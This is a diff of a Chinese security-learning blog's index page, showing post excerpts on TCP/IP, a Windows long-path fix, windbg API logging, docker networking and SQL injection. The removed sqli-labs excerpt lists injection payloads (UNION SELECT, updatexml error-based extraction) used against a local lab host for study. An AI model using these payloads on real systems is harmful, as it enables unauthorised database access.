+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/TCPIP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">TCP-IP 学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2024-03-10T00:00:00+08:00">2024-03-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h3><h4 id="1、ARP协议"><a href="#1、ARP协议" class="headerlink" title="1、ARP协议"></a>1、ARP协议</h4><p>二层协议，物理层+数据链路层+ARP协议</p>
+<p> 用于转换IP地址到MAC地址。</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202311021747352.png" alt="image-20231102174739284"></p>
+<h4 id="2、ICMP协议"><a href="#2、ICMP协议" class="headerlink" title="2、ICMP协议"></a>2、ICMP协议</h4><p>三层协议，物理层+数据链路层+网络层+ICMP协议</p>
+<p>用来与其他主机或路由器交换错误报文和其他重要信息。</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202311021747324.png" alt="image-20231102174709184"></p>
+<h4 id="3、unix-系统端口定义文件"><a href="#3、unix-系统端口定义文件" class="headerlink" title="3、unix 系统端口定义文件"></a>3、unix 系统端口定义文件</h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/TCPIP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/02/19/Web%E6%B8%97%E9%80%8F/python%20%E5%BC%80%E5%8F%91xss%E6%89%AB%E6%8F%8F%E5%99%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -239,6 +777,168 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2024/02/19/Web%E6%B8%97%E9%80%8F/python%20%E5%BC%80%E5%8F%91xss%E6%89%AB%E6%8F%8F%E5%99%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/01/24/%E7%BC%96%E7%A8%8B/windows%20%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/01/24/%E7%BC%96%E7%A8%8B/windows%20%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/" class="post-title-link" itemprop="url">windows 路径长度限制问题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-24 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-24T00:00:00+08:00">2024-01-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">编程</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="1、问题"><a href="#1、问题" class="headerlink" title="1、问题"></a>1、问题</h4><p>windows默认路径最大长度是260个字符，当程序遇到的路径超过260个字符时，就会出现windows Error3 错误，找不到对应的路径。</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202401241419804.png" alt="image-20240124141924671"></p>
+<h4 id="2、解决方法"><a href="#2、解决方法" class="headerlink" title="2、解决方法"></a>2、解决方法</h4><p>打开注册表</p>
+<p>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem  </p>
+<p>LongPathsEnabled   设置为 1 即可</p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/01/24/%E7%BC%96%E7%A8%8B/windows%20%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2024/01/17/%E9%80%86%E5%90%91/%E7%9B%91%E6%8E%A7API%E8%B0%83%E7%94%A8%E7%9A%84windbg%20%E6%8F%92%E4%BB%B6%20Logexts/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hack_zz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hack_zz">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/01/17/%E9%80%86%E5%90%91/%E7%9B%91%E6%8E%A7API%E8%B0%83%E7%94%A8%E7%9A%84windbg%20%E6%8F%92%E4%BB%B6%20Logexts/" class="post-title-link" itemprop="url">监控API调用的windbg 插件 Logexts</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-17 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-17T00:00:00+08:00">2024-01-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1、背景</p>
+<p>病毒分析时，对一些程序需要快速分析其功能，需要知道其API调用都有哪些，windbg 提供了一个插件可以实现这个功能，这个插件就是logexts。</p>
+<p>2 使用介绍</p>
+<p>!logexts.logi<br>将Logger注入目标程序，初始化监控，但是并不开启它。</p>
+<p>!logexts.loge<br>开启监控，如果之前没有调用logexts.logi，这个扩展命令会先初始化监控，然后启动。</p>
+<p>!logexts.logd<br>停止监控。这个命令会摘掉所有的Hook，从而让程序自由运行。不过COM的Hook并不会被摘除。</p>
+<p>!logexts.logo<br>显示或者修改输出选项，这里有三种输出方式：1.在调试器中显示，2.输出到一个文本文件，3.输出到lgv文件。其中lgv文件会包含更多的信息，我们可以使用LogViewer进行查看。</p>
+<p>!logexts.logc<br>显示或者控制监控的API分类。</p>
+<p>!logexts.logb<br>显示或者刷新输出缓存。由于如果在监控过程中发生异常，那么扩展可能无法将记录的日志写入文件中，这个时候我们就需要这个命令，手动的将缓存中的数据写入文件。</p>
+<p>!logexts.logm<br>显示和创建模块的包含&#x2F;排除列表。这可以帮助我们指定记录那些特定模块中的API调用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/01/17/%E9%80%86%E5%90%91/%E7%9B%91%E6%8E%A7API%E8%B0%83%E7%94%A8%E7%9A%84windbg%20%E6%8F%92%E4%BB%B6%20Logexts/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -351,701 +1051,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/12/19/Web%E6%B8%97%E9%80%8F/docker%20%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/19/Web%E6%B8%97%E9%80%8F/docker%20%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE/" class="post-title-link" itemprop="url">虚拟机中的docker 网络问题解决</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-12-19 00:00:00" itemprop="dateCreated datePublished" datetime="2023-12-19T00:00:00+08:00">2023-12-19</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Web 环境 部署在 虚拟机上的docker容器中，虚拟机挂起后访问失败。这是因为 虚拟机在挂起或者重启后，采用桥接网卡的网络设置会发生变更。<br>此时需要永久保留虚拟机的网络配置</p>
-<ul>
-<li><p>使能进行数据包转发</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line"></span><br><span class="line">vim /usr/lib/sysctl.d/00-system.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尾部添加设置</span></span><br><span class="line"></span><br><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>重启网络服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure></li>
-</ul>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/12/19/Web%E6%B8%97%E9%80%8F/docker%20%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/12/16/Web%E6%B8%97%E9%80%8F/sqli-labs%20%E5%AE%9E%E6%88%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/16/Web%E6%B8%97%E9%80%8F/sqli-labs%20%E5%AE%9E%E6%88%98/" class="post-title-link" itemprop="url">sqli-labs 学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-12-16 00:00:00" itemprop="dateCreated datePublished" datetime="2023-12-16T00:00:00+08:00">2023-12-16</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1、lesson 1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 测试步骤1 测试是否是数值型，显示一致，说明不是数值型</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1 and 1= 1  正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1 and 1= 2  正常显示 </span><br><span class="line"># 测试步骤2 加单引号报错，继续测试，两种回显不一致，说明存在注入点，是字符型</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27;  报错</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种</span><br><span class="line"># order 确定列数  确认列数为三列</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 1 --+  回显正常</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 2 --+  回显正常</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 3 --+  回显正常</span><br><span class="line">http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 4 --+  报错 </span><br><span class="line"># 联合查询，输出2,3 </span><br><span class="line">http://192.168.101.10:12345/Less-1/?id= -1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p>2、lesson 2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 测试步骤1 测试是否是数值型，显示不一致</span><br><span class="line">http://192.168.101.10:12345/Less-2/?id=1 and 1= 1  正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-2/?id=1 and 1= 2  另一种</span><br><span class="line"></span><br><span class="line"># 测试步骤2 加单引号报错，进一步确认存在注入点</span><br><span class="line">http://192.168.101.10:12345/Less-2?id=1&#x27;</span><br><span class="line"></span><br><span class="line"># order 确定列数  确认列数为三列</span><br><span class="line">http://192.168.101.10:12345/Less-2/?id=1 order by 4 --+  报错 </span><br><span class="line"></span><br><span class="line">#  联合查询，输出2,3 </span><br><span class="line">http://192.168.101.10:12345/Less-2/?id= -1 union select 1,2,3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>3、lesson 3</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 测试步骤1 测试是否是数值型，显示一致</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id=1 and 1= 1  正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id=1 and 1= 2  正常显示</span><br><span class="line"></span><br><span class="line"># 测试步骤2 加单引号报错，继续测试，两种回显报错，说明语句有问题,但是是字符型</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id=1&#x27;  报错</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 报错</span><br><span class="line"></span><br><span class="line"># 测试步骤3 ，加)  实际语句应该是 select * from id=(&#x27;$id&#x27;) 类似这种</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id=1&#x27;) and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id=1&#x27;) and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种</span><br><span class="line"></span><br><span class="line"># 测试步骤3 order 确定列数  确认列数为三列</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id= 1&#x27;) order by 4 --+ 报错</span><br><span class="line"></span><br><span class="line"># 测试步骤4 联合注入</span><br><span class="line">http://192.168.101.10:12345/Less-3/?id= -1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-
-<p>4、lesson 4</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 测试步骤1 测试是否是数值型，显示一致</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1 and 1= 1  正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1 and 1= 2  正常显示</span><br><span class="line"></span><br><span class="line"># 测试步骤2 加单引号,正常显示，加双引号</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&#x27;  正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&quot;  报错</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&quot; and &#x27;1&#x27;=&#x27;1&#x27; --+ 报错</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&quot; and &quot;1&quot;=&quot;1&quot; --+ 报错 </span><br><span class="line"></span><br><span class="line"># 测试步骤3 ，加)  实际语句应该是 select * from id=(&quot;$id&quot;) 类似这种</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&quot;) and &quot;1&quot;=&quot;1&quot; --+  --+ 正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&quot;) and &quot;1&quot;=&quot;2&quot; --+  --+ 另一种</span><br><span class="line"></span><br><span class="line"># 测试步骤3 order 确定列数  确认列数为三列</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=1&quot;) order by 4 --+</span><br><span class="line"></span><br><span class="line"># 测试步骤4 联合注入</span><br><span class="line">http://192.168.101.10:12345/Less-4/?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-
-<p>5、lesson5 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 测试步骤1 测试是否是数值型，显示一致</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1 and 1= 1  正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1 and 1= 2  正常显示</span><br><span class="line"></span><br><span class="line"># 测试步骤2 加单引号,正常显示，加双引号</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1&#x27;  报错</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种</span><br><span class="line"></span><br><span class="line"># 测试步骤3 order 确定列数  确认列数为三列</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1&#x27; order by 4 --+</span><br><span class="line"></span><br><span class="line"># 测试步骤4 联合注入</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=-1&#x27; union select 1,2,3 --+ 不显示2，3</span><br><span class="line"></span><br><span class="line"># 测试步骤5 报错注入</span><br><span class="line">http://192.168.101.10:12345/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+  显示数据库名字</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/12/16/Web%E6%B8%97%E9%80%8F/sqli-labs%20%E5%AE%9E%E6%88%98/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/11/28/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/28/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL 注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-11-28 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-28T00:00:00+08:00">2023-11-28</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="一、数据类型"><a href="#一、数据类型" class="headerlink" title="一、数据类型"></a>一、数据类型</h4><p>1）数字型</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id=1;</span><br></pre></td></tr></table></figure>
-
-<p>2）字符型</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where username=&#x27;zz&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>3）搜索型</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id like &#x27;%woniu%&#x27;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2、注入步骤-联合注入"><a href="#2、注入步骤-联合注入" class="headerlink" title="2、注入步骤 - 联合注入"></a>2、注入步骤 - 联合注入</h4><p>1） 通过and 1&#x3D;2 ,and 1&#x3D;2 以及单引号等特殊语句来确定是否存在注入点，and 1&#x3D;1 和and 1&#x3D;2 返回不一致，代表有注入点，测试时注意字符型和数字型的区别，and 1&#x3D;1 正常返回结果，and 1&#x3D;2 没有返回</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/11/28/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/11/16/Web%E6%B8%97%E9%80%8F/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hack_zz">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hack_zz">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/11/16/Web%E6%B8%97%E9%80%8F/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">验证码原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-11-16 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-16T00:00:00+08:00">2023-11-16</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1、简单代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span 